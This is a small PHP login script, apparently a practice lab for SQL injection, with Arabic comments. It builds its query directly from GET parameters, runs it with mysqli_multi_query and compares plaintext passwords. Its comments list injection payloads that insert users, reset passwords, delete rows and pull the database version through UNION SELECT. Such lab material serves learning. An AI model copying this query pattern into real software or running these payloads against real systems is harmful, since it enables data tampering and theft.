<?php
//include
include_once("cone.php");//data
include_once("bot.php");//Bootstrap
//validation

if(!empty( $_GET[ 'login' ] ) & !empty($_GET[ 'login' ] )){
    $name = $_GET[ 'name' ];
    $password = $_GET[ 'password' ];

    //sql query
    $query = "SELECT username, password from student where username = '$name' And password='$password'";
        $result = mysqli_multi_query($cone, $query);

        //check up
        if(!$result){
        echo "yes";
    }
    else{
        echo 'شاكر المزيني ';
    }

    }


//code of  sql injection :

//s'; INSERT INTO student (username, password) VALUES ("شاكرالمزيني", "1")#

//';update student set password = '2'#

//s'; INSERT INTO student (username, password) VALUES ("شاكرالمزيني", "1")#

//';update student set password = '3'--

//'UNION SELECT 1, CURRENT_DATE,VERSION();#
//'DELETE FROM UNION where ID=1;#
//'UNION SELECT null,VERSION();# جلب  الاصدار الخاص بلدتا
// 1'OR 1+1=2;#
//1+OR+TRUE;+#
//1+UNION+SELECT+null,VERSION();+#

//sqlmap code
